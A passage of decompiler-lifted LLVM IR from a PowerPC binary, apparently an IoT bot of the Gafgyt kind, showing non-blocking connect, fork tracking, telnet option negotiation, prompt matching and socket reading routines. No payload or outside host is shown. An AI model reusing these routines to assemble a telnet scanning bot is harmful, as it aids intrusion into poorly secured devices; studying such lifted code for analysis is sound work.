  %v4_10002244 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1001631c.33, i32 0, i32 0), i32 268500992)
  br label %dec_label_pc_100022d8

dec_label_pc_10002254:                            ; preds = %entry
  %v1_10002258 = add i32 %v1_10002224, 16
  %v2_10002258 = inttoptr i32 %v1_10002258 to i32*
  %v3_10002258 = load i32, i32* %v2_10002258, align 4
  %v1_1000227c = inttoptr i32 %v3_10002258 to i32*
  %v2_1000227c = load i32, i32* %v1_1000227c, align 4
  %v3_10002280 = icmp eq i32 %v2_1000227c, 0
  br i1 %v3_10002280, label %dec_label_pc_100022d0, label %dec_label_pc_10002288

dec_label_pc_10002288:                            ; preds = %dec_label_pc_10002254
  %v2_1000229c = load i32, i32* %v1_1000227c, align 4
  %v1_100022a0 = inttoptr i32 %v2_1000229c to i32*
  %v2_100022a0 = load i32, i32* %v1_100022a0, align 4
  store i32 %v2_100022a0, i32* %stack_var_-16, align 4
  store i32 268444340, i32* @lr, align 4
  %v3_100022b0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-16, i32 %v2_1000229c)
  %v2_100022c0 = inttoptr i32 %v3_100022b0 to i8*
  %v3_100022c0 = call i32 @strcpy(i32 %arg2, i8* %v2_100022c0)
  br label %dec_label_pc_100022d8

dec_label_pc_100022d0:                            ; preds = %dec_label_pc_10002254
  br label %dec_label_pc_100022d8

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_10002288, %dec_label_pc_1000223c, %dec_label_pc_100022d0
  %stack_var_-12.0 = phi i32 [ 1, %dec_label_pc_1000223c ], [ 1, %dec_label_pc_100022d0 ], [ 0, %dec_label_pc_10002288 ]
  ret i32 %stack_var_-12.0

; uselistorder directives
  uselistorder label %dec_label_pc_100022d8, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444464, i32* @lr, align 4
  %v2_1000232c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_10002358.36 to i32), i32* @lr, align 4
  %v2_10002354 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_10002364 = urem i32 %arg3, 65536
  store i32 %v1_10002364, i32* @r3, align 4
  %v1_1000236c = call i32 @htons(i32 %v1_10002364)
  %v2_1000237c = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000238c = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_1000237c)
  %v3_10002394 = icmp eq i32 %v4_1000238c, 0
  br i1 %v3_10002394, label %dec_label_pc_100023a8, label %dec_label_pc_1000239c

dec_label_pc_1000239c:                            ; preds = %entry
  br label %dec_label_pc_10002568

dec_label_pc_100023a8:                            ; preds = %entry
  store i32 268444628, i32* @lr, align 4
  %v3_100023d0 = call i32 @__libc_connect(i32 %arg1, i32 %v2_1000237c, i32 16)
  %tmp26 = icmp sgt i32 %v3_100023d0, -1
  br i1 %tmp26, label %dec_label_pc_10002524, label %dec_label_pc_100023e8

dec_label_pc_100023e8:                            ; preds = %dec_label_pc_100023a8
  %v0_100023e8 = call i32 @__errno_location()
  %v1_100023f0 = inttoptr i32 %v0_100023e8 to i32*
  %v2_100023f0 = load i32, i32* %v1_100023f0, align 4
  %v3_100023f4 = icmp eq i32 %v2_100023f0, 115
  br i1 %v3_100023f4, label %dec_label_pc_100023fc, label %dec_label_pc_10002518

dec_label_pc_100023fc:                            ; preds = %dec_label_pc_100023e8
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_1000240c = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_1000240c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge

dec_label_pc_10002420.dec_label_pc_10002420_crit_edge: ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge, %dec_label_pc_100023fc
  %v3_10002424.pre = phi i32 [ %v2_1000240c, %dec_label_pc_100023fc ], [ %v3_10002424.pre.pre, %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge ]
  %v1_1000243c30 = phi i32 [ 1, %dec_label_pc_100023fc ], [ %v1_1000243c, %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge ]
  %v1_10002428 = mul nuw nsw i32 %v1_1000243c30, 4
  %v2_1000242c = add i32 %v1_10002428, %v3_10002424.pre
  %v2_10002434 = inttoptr i32 %v2_1000242c to i32*
  store i32 0, i32* %v2_10002434, align 4
  %v1_1000243c = add nuw nsw i32 %v1_1000243c30, 1
  %tmp27 = icmp ult i32 %v1_1000243c, 32
  br i1 %tmp27, label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge, label %dec_label_pc_10002450

dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge: ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge
  %v3_10002424.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge

dec_label_pc_10002450:                            ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge
  %v1_10002454 = udiv i32 %arg1, 32
  %v1_1000245c = mul nuw nsw i32 %v1_10002454, 4
  %v2_10002460 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002464 = add nuw nsw i32 %v1_1000245c, 32
  %v1_10002468 = add i32 %v2_10002464, %v2_10002460
  %v1_1000246c = inttoptr i32 %v1_10002468 to i32*
  %v2_1000246c = load i32, i32* %v1_1000246c, align 4
  %v1_10002474 = urem i32 %arg1, 32
  %v3_1000247c = shl i32 1, %v1_10002474
  %v2_10002480 = or i32 %v2_1000246c, %v3_1000247c
  store i32 %v2_10002480, i32* %v1_1000246c, align 4
  %v1_1000249c = add i32 %arg1, 1
  %v2_100024a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268444864, i32* @lr, align 4
  %v5_100024bc = call i32 @__libc_select(i32 %v1_1000249c, i32 0, i32 %v2_1000240c, i32 0, i32 %v2_100024a4)
  %tmp28 = icmp slt i32 %v5_100024bc, 1
  br i1 %tmp28, label %dec_label_pc_1000250c, label %dec_label_pc_100024cc

dec_label_pc_100024cc:                            ; preds = %dec_label_pc_10002450
  store i32 4, i32* %stack_var_-48, align 4
  %v2_100024d4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_100024d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268444916, i32* @lr, align 4
  %v5_100024f0 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_100024d4, i32 %v2_100024d8)
  %v3_100024f4 = load i32, i32* %stack_var_-44, align 4
  %v3_100024f8 = icmp eq i32 %v3_100024f4, 0
  br i1 %v3_100024f8, label %dec_label_pc_10002524, label %dec_label_pc_10002500

dec_label_pc_10002500:                            ; preds = %dec_label_pc_100024cc
  br label %dec_label_pc_10002568

dec_label_pc_1000250c:                            ; preds = %dec_label_pc_10002450
  br label %dec_label_pc_10002568

dec_label_pc_10002518:                            ; preds = %dec_label_pc_100023e8
  br label %dec_label_pc_10002568

dec_label_pc_10002524:                            ; preds = %dec_label_pc_100024cc, %dec_label_pc_100023a8
  store i32 268444984, i32* @lr, align 4
  %v2_10002534 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_10002544 = call i32 @__asm_rlwinm(i32 %v2_10002534, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_10002560.37 to i32), i32* @lr, align 4
  %v2_1000255c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_10002568

dec_label_pc_10002568:                            ; preds = %dec_label_pc_10002518, %dec_label_pc_1000250c, %dec_label_pc_10002500, %dec_label_pc_1000239c, %dec_label_pc_10002524
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_10002524 ], [ 0, %dec_label_pc_1000250c ], [ 0, %dec_label_pc_10002500 ], [ 0, %dec_label_pc_10002518 ], [ 0, %dec_label_pc_1000239c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_1000243c, { 1, 0 }
  uselistorder i32 %v2_1000240c, { 1, 0, 2 }
  uselistorder i32 %v2_1000237c, { 1, 0 }
  uselistorder i32 %v1_10002364, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_10002568, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445088, i32* @lr, align 4
  %v0_1000259c = call i32 @__libc_fork()
  %v3_100025ac = icmp eq i32 %v0_1000259c, 0
  br i1 %v3_100025ac, label %dec_label_pc_10002730, label %dec_label_pc_100025c0

dec_label_pc_100025c0:                            ; preds = %entry
  %v3_100025c8 = load i32, i32* @global_var_1002abb4.39, align 4
  %v2_100025cc = load i32, i32* @global_var_1002abb0.38, align 4
  %v1_100025d0 = add i32 %v3_100025c8, 1
  %v2_100025d0 = icmp eq i32 %v3_100025c8, -1
  %v2_100025d4 = zext i1 %v2_100025d0 to i32
  %v3_100025d4 = add i32 %v2_100025d4, %v2_100025cc
  store i32 %v3_100025d4, i32* @global_var_1002abb0.38, align 4
  store i32 %v1_100025d0, i32* @global_var_1002abb4.39, align 4
  %v1_10002604 = mul i32 %v1_100025d0, 4
  %v1_1000260c = add i32 %v1_10002604, 4
  store i32 268445208, i32* @lr, align 4
  %v1_10002614 = call i32 @malloc(i32 %v1_1000260c)
  br label %dec_label_pc_1000266c

dec_label_pc_1000262c:                            ; preds = %dec_label_pc_1000266c, %dec_label_pc_100026bc
  %v1_10002630 = mul i32 %storemerge2, 4
  %v2_1000263c = add i32 %v1_10002630, %v1_10002614
  %v3_10002650 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_10002654 = add i32 %v3_10002650, %v1_10002630
  %v1_10002658 = inttoptr i32 %v2_10002654 to i32*
  %v2_10002658 = load i32, i32* %v1_10002658, align 4
  %v2_1000265c = inttoptr i32 %v2_1000263c to i32*
  store i32 %v2_10002658, i32* %v2_1000265c, align 4
  %v1_10002664 = add i32 %storemerge2, 1
  br label %dec_label_pc_1000266c

dec_label_pc_1000266c:                            ; preds = %dec_label_pc_100025c0, %dec_label_pc_1000262c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_100025c0 ], [ %v1_10002664, %dec_label_pc_1000262c ]
  %v3_10002694 = load i32, i32* @global_var_1002abb4.39, align 4
  %v2_10002698 = load i32, i32* @global_var_1002abb0.38, align 4
  %v2_1000269c = icmp ne i32 %v3_10002694, 0
  %v3_100026a0 = add i32 %v2_10002698, -1
  %v4_100026a0 = sext i1 %v2_1000269c to i32
  %v3_100026b4 = icmp eq i32 %v3_100026a0, %v4_100026a0
  br i1 %v3_100026b4, label %dec_label_pc_100026bc, label %dec_label_pc_1000262c

dec_label_pc_100026bc:                            ; preds = %dec_label_pc_1000266c
  %v1_1000269c = add i32 %v3_10002694, -1
  %v3_100026d4 = icmp ugt i32 %v1_1000269c, %storemerge2
  br i1 %v3_100026d4, label %dec_label_pc_1000262c, label %dec_label_pc_100026dc

dec_label_pc_100026dc:                            ; preds = %dec_label_pc_100026bc
  %v1_100026f0 = mul i32 %v3_10002694, 4
  %v2_100026fc = add i32 %v1_10002614, -4
  %v1_10002700 = add i32 %v2_100026fc, %v1_100026f0
  %v2_10002708 = inttoptr i32 %v1_10002700 to i32*
  store i32 %v0_1000259c, i32* %v2_10002708, align 4
  %v3_10002710 = load i32, i32* @global_var_1002abdc.40, align 4
  store i32 268445468, i32* @lr, align 4
  %v1_10002718 = call i32 @free(i32 %v3_10002710)
  store i32 %v1_10002614, i32* @global_var_1002abdc.40, align 4
  br label %dec_label_pc_10002730

dec_label_pc_10002730:                            ; preds = %entry, %dec_label_pc_100026dc
  ret i32 %v0_1000259c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002630, { 1, 0 }
  uselistorder i32 %v1_10002614, { 1, 2, 0 }
  uselistorder i32 %v3_100025c8, { 1, 0 }
  uselistorder label %dec_label_pc_10002730, { 1, 0 }
  uselistorder label %dec_label_pc_1000266c, { 1, 0 }
  uselistorder label %dec_label_pc_1000262c, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002774 = add i32 %arg2, 1
  %v1_10002778 = inttoptr i32 %v1_10002774 to i8*
  %v2_10002778 = load i8, i8* %v1_10002778, align 1
  %v1_10002788 = icmp ult i8 %v2_10002778, -5
  br i1 %v1_10002788, label %dec_label_pc_100028e0, label %dec_label_pc_10002790

dec_label_pc_10002790:                            ; preds = %entry
  %v2_10002794 = icmp eq i8 %v2_10002778, -1
  br i1 %v2_10002794, label %dec_label_pc_1000279c, label %dec_label_pc_100027b8

dec_label_pc_1000279c:                            ; preds = %dec_label_pc_10002790
  br label %dec_label_pc_100028e0

dec_label_pc_100027b8:                            ; preds = %dec_label_pc_10002790
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_100027c4 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268445656, i32* @lr, align 4
  %v4_100027d4 = call i32 @__libc_send(i32 %arg1, i32 %v2_100027c4, i32 1, i32 16384)
  %v2_100027e0 = load i8, i8* %v1_10002778, align 1
  %v3_100027e8 = icmp eq i8 %v2_100027e0, -4
  br i1 %v3_100027e8, label %dec_label_pc_100027f0, label %dec_label_pc_100027fc

dec_label_pc_100027f0:                            ; preds = %dec_label_pc_100027b8
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_100027fc:                            ; preds = %dec_label_pc_100027b8
  %v2_10002804 = load i8, i8* %v1_10002778, align 1
  %v3_1000280c = icmp eq i8 %v2_10002804, -2
  br i1 %v3_1000280c, label %dec_label_pc_10002814, label %dec_label_pc_10002820

dec_label_pc_10002814:                            ; preds = %dec_label_pc_100027fc
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_10002820:                            ; preds = %dec_label_pc_100027fc
  %v2_10002828 = load i8, i8* %v1_10002778, align 1
  %v3_10002830 = icmp eq i8 %v2_10002828, 3
  br i1 %v3_10002830, label %dec_label_pc_10002838, label %dec_label_pc_10002870

dec_label_pc_10002838:                            ; preds = %dec_label_pc_10002820
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_10002870:                            ; preds = %dec_label_pc_10002820
  %v3_10002848 = icmp eq i8 %v2_10002828, -3
  %.7 = select i1 %v3_10002848, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_100028a4:                            ; preds = %dec_label_pc_10002838, %dec_label_pc_10002814, %dec_label_pc_100027f0, %dec_label_pc_10002870
  store i32 268445884, i32* @lr, align 4
  %v4_100028b8 = call i32 @__libc_send(i32 %arg1, i32 %v2_100027c4, i32 1, i32 16384)
  %v1_100028c0 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_100028d8.41 to i32), i32* @lr, align 4
  %v4_100028d4 = call i32 @__libc_send(i32 %arg1, i32 %v1_100028c0, i32 1, i32 16384)
  br label %dec_label_pc_100028e0

dec_label_pc_100028e0:                            ; preds = %dec_label_pc_1000279c, %dec_label_pc_100028a4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_100028e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100028a4, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000292c = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_1001632c.42 to i32), i32* @r3, align 4
  %v0_10002a6810 = call i32 @__GI_strlen()
  %v2_10002a7012 = icmp eq i32 %v0_10002a6810, 0
  br i1 %v2_10002a7012, label %dec_label_pc_10002a80, label %dec_label_pc_10002958.preheader.lr.ph

dec_label_pc_10002958.preheader.lr.ph:            ; preds = %entry
  %v2_10002974 = add i32 %v0_1000292c, %arg1
  br label %dec_label_pc_10002958.preheader

dec_label_pc_1000294c:                            ; preds = %dec_label_pc_100029e0, %dec_label_pc_100029b8, %dec_label_pc_10002990, %dec_label_pc_10002968
  %v1_10002950 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002960 = icmp sgt i32 %v0_1000292c, %v1_10002950
  br i1 %v3_10002960, label %dec_label_pc_10002968, label %dec_label_pc_10002a08

dec_label_pc_10002968:                            ; preds = %dec_label_pc_10002958.preheader, %dec_label_pc_1000294c
  %stack_var_-40.08 = phi i32 [ %v1_10002950, %dec_label_pc_1000294c ], [ %stack_var_-40.115, %dec_label_pc_10002958.preheader ]
  %v2_1000297c = sub i32 %v2_10002974, %stack_var_-40.08
  %v1_10002980 = inttoptr i32 %v2_1000297c to i8*
  %v2_10002980 = load i8, i8* %v1_10002980, align 1
  %v3_10002988 = icmp eq i8 %v2_10002980, 0
  br i1 %v3_10002988, label %dec_label_pc_1000294c, label %dec_label_pc_10002990

dec_label_pc_10002990:                            ; preds = %dec_label_pc_10002968
  %v2_100029a8 = load i8, i8* %v1_10002980, align 1
  %v3_100029b0 = icmp eq i8 %v2_100029a8, 32
  br i1 %v3_100029b0, label %dec_label_pc_1000294c, label %dec_label_pc_100029b8

dec_label_pc_100029b8:                            ; preds = %dec_label_pc_10002990
  %v2_100029d0 = load i8, i8* %v1_10002980, align 1
  %v3_100029d8 = icmp eq i8 %v2_100029d0, 13
  br i1 %v3_100029d8, label %dec_label_pc_1000294c, label %dec_label_pc_100029e0

dec_label_pc_100029e0:                            ; preds = %dec_label_pc_100029b8
  %v2_100029f8 = load i8, i8* %v1_10002980, align 1
  %v3_10002a00 = icmp eq i8 %v2_100029f8, 10
  br i1 %v3_10002a00, label %dec_label_pc_1000294c, label %dec_label_pc_10002a08

dec_label_pc_10002a08:                            ; preds = %dec_label_pc_100029e0, %dec_label_pc_1000294c, %dec_label_pc_10002958.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002958.preheader ], [ %stack_var_-40.08, %dec_label_pc_100029e0 ], [ %v1_10002950, %dec_label_pc_1000294c ]
  %v2_10002a1c = sub i32 %v2_10002974, %stack_var_-40.0.lcssa
  %v1_10002a20 = inttoptr i32 %v2_10002a1c to i8*
  %v2_10002a20 = load i8, i8* %v1_10002a20, align 1
  %v2_10002a34 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_1001632c.42 to i32)
  %v1_10002a38 = inttoptr i32 %v2_10002a34 to i8*
  %v2_10002a38 = load i8, i8* %v1_10002a38, align 1
  %v4_10002a40 = icmp eq i8 %v2_10002a20, %v2_10002a38
  br i1 %v4_10002a40, label %dec_label_pc_10002a80, label %dec_label_pc_10002a54

dec_label_pc_10002a54:                            ; preds = %dec_label_pc_10002a08
  %v1_10002a58 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_1001632c.42 to i32), i32* @r3, align 4
  %v0_10002a68 = call i32 @__GI_strlen()
  %v2_10002a70 = icmp ult i32 %v1_10002a58, %v0_10002a68
  br i1 %v2_10002a70, label %dec_label_pc_10002958.preheader, label %dec_label_pc_10002a80

dec_label_pc_10002958.preheader:                  ; preds = %dec_label_pc_10002958.preheader.lr.ph, %dec_label_pc_10002a54
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002958.preheader.lr.ph ], [ %v1_10002a58, %dec_label_pc_10002a54 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002958.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002a54 ]
  %v3_100029606 = icmp sgt i32 %v0_1000292c, %stack_var_-40.115
  br i1 %v3_100029606, label %dec_label_pc_10002968, label %dec_label_pc_10002a08

dec_label_pc_10002a80:                            ; preds = %entry, %dec_label_pc_10002a08, %dec_label_pc_10002a54
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002a08 ], [ 0, %dec_label_pc_10002a54 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002a58, { 1, 0 }
  uselistorder i32 %v0_1000292c, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1001632c.42 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002a80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002958.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002a08, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002ad4 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002d145 = add i32 %v0_10002ad4, 2
  %v2_10002d1c6 = icmp slt i32 %v1_10002d145, %arg7
  br i1 %v2_10002d1c6, label %dec_label_pc_10002d24.lr.ph, label %dec_label_pc_10002d54

dec_label_pc_10002d24.lr.ph:                      ; preds = %entry
  %v2_10002b0c = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002b54 = udiv i32 %arg1, 32
  %v1_10002b5c = mul nuw nsw i32 %v1_10002b54, 4
  %v2_10002b60 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002b64 = add nuw nsw i32 %v1_10002b5c, 24
  %v1_10002b68 = add i32 %v2_10002b64, %v2_10002b60
  %v1_10002b6c = inttoptr i32 %v1_10002b68 to i32*
  %v1_10002b74 = urem i32 %arg1, 32
  %v3_10002b7c = shl i32 1, %v1_10002b74
  %v1_10002b9c = add i32 %arg1, 1
  %v2_10002ba4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002cd4 = inttoptr i32 %arg2 to i8*
  %v3_10002ce8 = icmp eq i32 %arg3, 0
  %v2_10002d34 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002d24

dec_label_pc_10002b0c:                            ; preds = %dec_label_pc_10002d30, %dec_label_pc_10002d24
  store i32 %v2_10002b0c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge

dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge: ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge, %dec_label_pc_10002b0c
  %v3_10002b24.pre = phi i32 [ %v2_10002b0c, %dec_label_pc_10002b0c ], [ %v3_10002b24.pre.pre, %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge ]
  %v1_10002b3c36 = phi i32 [ 1, %dec_label_pc_10002b0c ], [ %v1_10002b3c, %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge ]
  %v1_10002b28 = mul nuw nsw i32 %v1_10002b3c36, 4
  %v2_10002b2c = add i32 %v1_10002b28, %v3_10002b24.pre
  %v2_10002b34 = inttoptr i32 %v2_10002b2c to i32*
  store i32 0, i32* %v2_10002b34, align 4
  %v1_10002b3c = add nuw nsw i32 %v1_10002b3c36, 1
  %tmp33 = icmp ult i32 %v1_10002b3c, 32
  br i1 %tmp33, label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge, label %dec_label_pc_10002b50

dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge: ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge
  %v3_10002b24.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge

dec_label_pc_10002b50:                            ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge
  %v2_10002b6c = load i32, i32* %v1_10002b6c, align 4
  %v2_10002b80 = or i32 %v2_10002b6c, %v3_10002b7c
  store i32 %v2_10002b80, i32* %v1_10002b6c, align 4
  store i32 268446656, i32* @lr, align 4
  %v5_10002bbc = call i32 @__libc_select(i32 %v1_10002b9c, i32 %v2_10002b0c, i32 0, i32 0, i32 %v2_10002ba4)
  %tmp34 = icmp slt i32 %v5_10002bbc, 1
  br i1 %tmp34, label %dec_label_pc_10002d54, label %dec_label_pc_10002bcc

dec_label_pc_10002bcc:                            ; preds = %dec_label_pc_10002b50
  %v2_10002bd8 = add i32 %stack_var_-196.09, %arg6
  store i32 268446708, i32* @lr, align 4
  %v4_10002bf0 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002bd8, i32 1, i32 0)
  %v4_10002c04 = icmp eq i32 %v4_10002bf0, -1
  br i1 %v4_10002c04, label %dec_label_pc_10002c18, label %dec_label_pc_10002c0c

dec_label_pc_10002c0c:                            ; preds = %dec_label_pc_10002bcc
  %v3_10002c10 = icmp eq i32 %v4_10002bf0, 0
  br i1 %v3_10002c10, label %dec_label_pc_10002c18, label %dec_label_pc_10002c24

dec_label_pc_10002c18:                            ; preds = %dec_label_pc_10002c0c, %dec_label_pc_10002bcc
  br label %dec_label_pc_10002d5c

dec_label_pc_10002c24:                            ; preds = %dec_label_pc_10002c0c
  %v2_10002c2c = add i32 %v4_10002bf0, %stack_var_-196.09
  %v4_10002c34 = inttoptr i32 %v2_10002bd8 to i8*
  %v3_10002c38 = load i8, i8* %v4_10002c34, align 1
  %v3_10002c40 = icmp eq i8 %v3_10002c38, -1
  br i1 %v3_10002c40, label %dec_label_pc_10002c48, label %dec_label_pc_10002ccc

dec_label_pc_10002c48:                            ; preds = %dec_label_pc_10002c24
  %v1_10002c4c = add i32 %v2_10002bd8, 1
  store i32 268446820, i32* @lr, align 4
  %v4_10002c60 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002c4c, i32 2, i32 0)
  %v4_10002c74 = icmp eq i32 %v4_10002c60, -1
  br i1 %v4_10002c74, label %dec_label_pc_10002c88, label %dec_label_pc_10002c7c

dec_label_pc_10002c7c:                            ; preds = %dec_label_pc_10002c48
  %v3_10002c80 = icmp eq i32 %v4_10002c60, 0
  br i1 %v3_10002c80, label %dec_label_pc_10002c88, label %dec_label_pc_10002c94

dec_label_pc_10002c88:                            ; preds = %dec_label_pc_10002c7c, %dec_label_pc_10002c48
  br label %dec_label_pc_10002d5c

dec_label_pc_10002c94:                            ; preds = %dec_label_pc_10002c7c
  %v2_10002c9c = add i32 %v4_10002c60, %v2_10002c2c
  store i32 268446900, i32* @lr, align 4
  %v4_10002cb0 = call i32 @negotiate(i32 %arg1, i32 %v2_10002bd8, i32 3, i32 %v2_10002c2c)
  %v3_10002cb8 = icmp eq i32 %v4_10002cb0, 0
  br i1 %v3_10002cb8, label %dec_label_pc_10002cc0, label %dec_label_pc_10002d10.backedge

dec_label_pc_10002cc0:                            ; preds = %dec_label_pc_10002c94
  br label %dec_label_pc_10002d5c

dec_label_pc_10002ccc:                            ; preds = %dec_label_pc_10002c24
  store i32 268446936, i32* @lr, align 4
  %v5_10002cd4 = call i32 @strstr(i32 %arg6, i8* %v4_10002cd4, i32 %v2_10002bd8)
  %v3_10002cdc = icmp eq i32 %v5_10002cd4, 0
  br i1 %v3_10002cdc, label %dec_label_pc_10002ce4, label %dec_label_pc_10002d48

dec_label_pc_10002ce4:                            ; preds = %dec_label_pc_10002ccc
  br i1 %v3_10002ce8, label %dec_label_pc_10002d10.backedge, label %dec_label_pc_10002cf0

dec_label_pc_10002d10.backedge:                   ; preds = %dec_label_pc_10002ce4, %dec_label_pc_10002cf0, %dec_label_pc_10002c94
  %stack_var_-196.0.be = phi i32 [ %v2_10002c9c, %dec_label_pc_10002c94 ], [ %v2_10002c2c, %dec_label_pc_10002ce4 ], [ %v2_10002c2c, %dec_label_pc_10002cf0 ]
  %v1_10002d14 = add i32 %stack_var_-196.0.be, 2
  %v2_10002d1c = icmp slt i32 %v1_10002d14, %arg7
  br i1 %v2_10002d1c, label %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge, label %dec_label_pc_10002d54

